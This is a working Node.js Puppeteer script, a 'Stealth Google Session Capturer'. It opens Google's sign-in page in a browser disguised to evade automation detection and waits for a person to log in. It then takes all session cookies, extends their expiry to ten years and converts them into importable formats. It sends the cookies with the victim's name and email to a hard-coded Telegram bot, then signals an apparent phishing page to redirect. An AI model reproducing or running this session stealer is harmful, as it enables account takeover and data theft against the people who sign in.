const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// ============================================================
// CONFIGURATION - Use environment variable or hardcode
// ============================================================
const BASE_URL = process.env.RAILWAY_STATIC_URL 
    ? `https://${process.env.RAILWAY_STATIC_URL}`
    : 'http://localhost:3000';

const CAPTURE_URL = `${BASE_URL}/capture`;
const REDIRECT_URL = `${BASE_URL}/redirect-success`;

console.log(`📡 Base URL: ${BASE_URL}`);

// ============================================================
// TELEGRAM CONFIG
// ============================================================
const TELEGRAM_BOT_TOKEN = '8774560748:AAFpyG22kcdAjSg_0BzN1SZJIdmBg5j-jiE';
const TELEGRAM_CHAT_ID = '8726827229';

// ============================================================
// SEND MESSAGE TO TELEGRAM
// ============================================================
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Telegram send failed:', error);
    }
}

// ============================================================
// SEND FILE TO TELEGRAM
// ============================================================
async function sendFileToTelegram(filePath, caption) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
        
        const fileBuffer = fs.readFileSync(filePath);
        const fileName = path.basename(filePath);
        
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', fileBuffer, {
            filename: fileName,
            contentType: 'application/json'
        });
        formData.append('caption', caption);
        
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
            headers: formData.getHeaders()
        });
        
        const result = await response.json();
        
        if (result.ok) {
            console.log(`✅ ${fileName} sent successfully!`);
            return true;
        } else {
            console.error(`❌ Failed: ${result.description}`);
            return false;
        }
        
    } catch (error) {
        console.error('File send failed:', error);
        return false;
    }
}

// ============================================================
// FORMAT COOKIES
// ============================================================
function formatCookiesForImport(cookies) {
    let netscapeFormat = '# Netscape HTTP Cookie File\n';
    netscapeFormat += '# http://curl.haxx.se/rfc/cookie_spec.html\n';
    netscapeFormat += '# This is a generated file!  Do not edit.\n\n';
    
    for (const cookie of cookies) {
        const domain = cookie.domain || '';
        const includeSubdomains = cookie.domain?.startsWith('.') ? 'TRUE' : 'FALSE';
        const path = cookie.path || '/';
        const secure = cookie.secure ? 'TRUE' : 'FALSE';
        const expires = cookie.expires || 0;
        const name = cookie.name || '';
        const value = cookie.value || '';
        
        netscapeFormat += `${domain}\t${includeSubdomains}\t${path}\t${secure}\t${expires}\t${name}\t${value}\n`;
    }
    
    return netscapeFormat;
}

function formatCookiesForEditThisCookie(cookies) {
    return cookies.map(cookie => ({
        domain: cookie.domain || '',
        expirationDate: cookie.expires || 0,
        hostOnly: cookie.hostOnly || false,
        httpOnly: cookie.httpOnly || false,
        name: cookie.name || '',
        path: cookie.path || '/',
        sameSite: cookie.sameSite || 'no_restriction',
        secure: cookie.secure || false,
        session: cookie.session || false,
        storeId: '0',
        value: cookie.value || '',
        id: Date.now() + Math.random() * 1000
    }));
}

function extendCookieLifespan(cookies, years = 10) {
    const extendedExpiry = Math.floor(Date.now() / 1000) + (years * 365 * 24 * 60 * 60);
    return cookies.map(cookie => ({
        ...cookie,
        expires: extendedExpiry,
        expirationDate: extendedExpiry
    }));
}

async function notifyRedirect(email) {
    try {
        await fetch(REDIRECT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email })
        });
        console.log('✅ Redirect notification sent!');
    } catch (error) {
        console.error('Failed to notify redirect:', error);
    }
}

// ============================================================
// MAIN CAPTURE FUNCTION
// ============================================================
async function captureGoogleSession() {
    console.log('🚀 Starting Stealth Puppeteer...');
    
    let browser;
    let page;
    
    try {
        browser = await puppeteer.launch({
            headless: false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1280,800',
                '--start-maximized',
                '--no-first-run',
                '--no-default-browser-check',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-renderer-backgrounding',
                '--disable-features=IsolateOrigins,site-per-process'
            ],
            ignoreDefaultArgs: ['--enable-automation']
        });

        page = await browser.newPage();

        await page.setViewport({ width: 1280, height: 800 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        console.log('🌐 Opening Google login...');
        await page.goto('https://accounts.google.com/', {
            waitUntil: 'networkidle2',
            timeout: 30000
        });

        console.log('👤 Please log in to Google');
        console.log('⏳ Waiting for login...');
        await sendToTelegram('🔄 **Google login opened.** Please sign in...');

        // Wait for login
        let loggedIn = false;
        let attempts = 0;
        const maxAttempts = 180;
        let userEmail = null;
        let userName = null;

        while (!loggedIn && attempts < maxAttempts) {
            attempts++;
            
            try {
                const loginCheck = await page.evaluate(() => {
                    let email = null;
                    let name = null;
                    
                    const emailEl = document.querySelector('[data-email]');
                    if (emailEl) {
                        email = emailEl.textContent || emailEl.getAttribute('data-email');
                    }
                    
                    if (!email) {
                        const accountEls = document.querySelectorAll('.gb_bb, .gb_ee, .gb_d');
                        for (const el of accountEls) {
                            const text = el.textContent || '';
                            if (text && text.includes('@')) {
                                email = text.trim();
                                break;
                            }
                        }
                    }
                    
                    const nameEl = document.querySelector('.gb_bb, .gb_ee');
                    if (nameEl) {
                        name = nameEl.textContent || '';
                    }
                    
                    const url = window.location.href;
                    const isLoggedIn = !!(email || url.includes('myaccount') || url.includes('mail.google.com'));
                    
                    return { loggedIn: isLoggedIn, email: email, name: name };
                });

                if (loginCheck.loggedIn) {
                    loggedIn = true;
                    userEmail = loginCheck.email || 'Unknown';
                    userName = loginCheck.name || 'Unknown';
                    console.log('✅ Login detected!', userEmail);
                    break;
                }

                if (attempts % 20 === 0) {
                    console.log(`⏳ Waiting... (${Math.floor(attempts/2)}s)`);
                }

                await page.waitForTimeout(1000);

            } catch (error) {
                // Ignore
            }
        }

        if (!loggedIn) {
            console.log('⏱️ Login timeout');
            await sendToTelegram('⏱️ **Login timeout.** Please try again.');
            await browser.close();
            return;
        }

        // Capture cookies
        console.log('🍪 Capturing cookies...');
        const allCookies = await page.cookies();
        console.log(`✅ Captured ${allCookies.length} cookies`);

        // Extend cookies to 10 years
        console.log('⏰ Extending cookies to 10 years...');
        const extendedCookies = extendCookieLifespan(allCookies, 10);
        console.log('✅ Cookies extended!');

        // Get user info
        let userInfo = null;
        try {
            const apiPage = await browser.newPage();
            await apiPage.setCookie(...allCookies);
            
            const response = await apiPage.goto('https://www.googleapis.com/oauth2/v2/userinfo', {
                waitUntil: 'networkidle2',
                timeout: 10000
            });
            
            if (response && response.ok()) {
                userInfo = await response.json();
                console.log('✅ User info:', userInfo.email);
            }
            await apiPage.close();
        } catch (error) {
            console.log('⚠️ Could not get user info via API');
        }

        const finalEmail = userInfo?.email || userEmail || 'Unknown';
        const finalName = userInfo?.name || userName || 'Unknown';

        // ============================================================
        // SAVE FILES
        // ============================================================
        const logDir = path.join(__dirname, 'data');
        if (!fs.existsSync(logDir)) {
            fs.mkdirSync(logDir, { recursive: true });
        }

        const timestamp = Date.now();
        const cleanEmail = finalEmail.replace(/[^a-zA-Z0-9]/g, '_');
        
        // 1. Extended cookies (10 years)
        const extendedFile = path.join(logDir, `cookies_10years_${cleanEmail}.json`);
        fs.writeFileSync(extendedFile, JSON.stringify(extendedCookies, null, 2));
        console.log('✅ 10-year cookies saved');

        // 2. Netscape format
        const netscapeFile = path.join(logDir, `cookies_netscape_${cleanEmail}.txt`);
        fs.writeFileSync(netscapeFile, formatCookiesForImport(extendedCookies));
        console.log('✅ Netscape format saved');

        // 3. EditThisCookie format
        const editFile = path.join(logDir, `cookies_editthiscookie_${cleanEmail}.json`);
        fs.writeFileSync(editFile, JSON.stringify(formatCookiesForEditThisCookie(extendedCookies), null, 2));
        console.log('✅ EditThisCookie format saved');

        // 4. Session data
        const sessionFile = path.join(logDir, `session_${cleanEmail}.json`);
        fs.writeFileSync(sessionFile, JSON.stringify({
            user: { 
                email: finalEmail, 
                name: finalName,
                picture: userInfo?.picture || null
            },
            cookies: allCookies,
            extended_cookies: extendedCookies,
            timestamp: new Date().toISOString(),
            cookie_expiry: '10 years',
            expiry_date: new Date(Date.now() + 10 * 365 * 24 * 60 * 60 * 1000).toISOString()
        }, null, 2));
        console.log('✅ Session saved');

        // ============================================================
        // SEND FILES TO TELEGRAM
        // ============================================================
        console.log('📤 Sending files to Telegram...');
        
        let sentCount = 0;
        
        const result1 = await sendFileToTelegram(extendedFile, `🔑 10 YEAR COOKIES - ${finalEmail}`);
        if (result1) sentCount++;
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const result2 = await sendFileToTelegram(netscapeFile, `📁 NETSCAPE FORMAT - ${finalEmail}`);
        if (result2) sentCount++;
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const result3 = await sendFileToTelegram(editFile, `📦 EDITTHISCOOKIE FORMAT - ${finalEmail}`);
        if (result3) sentCount++;
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const result4 = await sendFileToTelegram(sessionFile, `📊 FULL SESSION DATA - ${finalEmail}`);
        if (result4) sentCount++;

        console.log(`✅ ${sentCount} of 4 files sent successfully!`);

        // ============================================================
        // SEND SUMMARY
        // ============================================================
        await sendToTelegram(`
🎯 **GOOGLE SESSION CAPTURED!**

👤 **Name:** ${finalName}
📧 **Email:** ${finalEmail}
🍪 **Cookies:** ${allCookies.length} captured
🔒 **Extended:** 10 YEARS!
📅 **Expires:** ${new Date(Date.now() + 10 * 365 * 24 * 60 * 60 * 1000).toISOString()}

✅ **${sentCount} files sent above - CLICK EACH TO DOWNLOAD!**
        `);

        // ============================================================
        // NOTIFY REDIRECT
        // ============================================================
        console.log('🔔 Notifying main page to redirect...');
        await notifyRedirect(finalEmail);

        // ============================================================
        // CLOSE BROWSER
        // ============================================================
        console.log('🔒 Closing Puppeteer browser...');
        await browser.close();
        console.log('✅ Puppeteer browser closed!');

        console.log(`✅ Complete! ${sentCount} files sent to Telegram!`);

    } catch (error) {
        console.error('❌ Error:', error);
        await sendToTelegram(`❌ **Error:** ${error.message}`);
        if (browser) {
            await browser.close();
        }
    }
}

// ============================================================
// RUN
// ============================================================
console.log('🚀 Stealth Google Session Capturer');
console.log('========================================');
console.log('📁 4 files will be sent as DOWNLOADABLE attachments!');
console.log('🔑 Cookies extended to 10 YEARS!');
console.log('========================================');

captureGoogleSession().catch(console.error);